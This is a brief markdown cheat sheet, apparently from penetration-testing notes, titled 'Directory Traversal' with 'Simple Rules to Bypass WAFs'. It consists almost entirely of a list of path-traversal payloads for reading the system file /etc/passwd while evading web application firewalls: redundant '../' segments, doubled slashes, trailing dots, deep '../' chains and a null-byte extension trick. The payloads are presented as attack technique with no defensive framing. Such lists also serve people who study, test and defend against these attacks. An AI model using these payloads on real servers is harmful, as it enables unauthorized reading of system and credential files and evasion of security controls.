<h1>$${\color{red}Directory} \space {\color{Goldenrod}Traversal }$$</h1>


## Simple Rules to Bypass WAFs

### Instead of using:

```/etc/passwd```

### The best choice is:

```
/too/../etc/far/../passwd
/etc//passwd
/etc/ignore/../passwd
/etc/passwd.......
../../../../../../../etc/passwd
/etc/passwd%00.png
```
